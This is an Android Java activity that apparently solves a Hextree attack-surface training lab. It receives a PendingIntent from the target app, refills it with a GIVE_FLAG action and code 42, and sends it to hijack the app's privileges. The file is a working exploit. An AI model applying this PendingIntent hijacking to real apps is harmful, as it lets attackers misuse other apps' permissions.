package niraj.patali.receivingpendingintent;

import android.app.PendingIntent;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "ExploitApp";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Receive the MUTATE_ME intent
        Intent intent = getIntent();
        if ("io.hextree.attacksurface.MUTATE_ME".equals(intent.getAction())) {
            // Extract the PendingIntent
            PendingIntent pendingIntent = intent.getParcelableExtra("pending_intent");

            if (pendingIntent != null) {
                try {
                    // Craft the new intent
                    Intent exploitIntent = new Intent("io.hextree.attacksurface.GIVE_FLAG");
                    exploitIntent.putExtra("code", 42); // Condition required for success()

                    // Send the PendingIntent
                    pendingIntent.send(this, 0, exploitIntent);

                    // Confirm success
                    Toast.makeText(this, "Hijacked PendingIntent sent successfully!", Toast.LENGTH_LONG).show();
                } catch (Exception e) {
                    Log.e(TAG, "Failed to send hijacked PendingIntent", e);
                    Toast.makeText(this, "Failed to send hijacked PendingIntent", Toast.LENGTH_SHORT).show();
                }
            } else {
                Toast.makeText(this, "No PendingIntent found in intent extras", Toast.LENGTH_SHORT).show();
            }
        } else {
            Toast.makeText(this, "No matching intent received", Toast.LENGTH_SHORT).show();
        }
    }
}
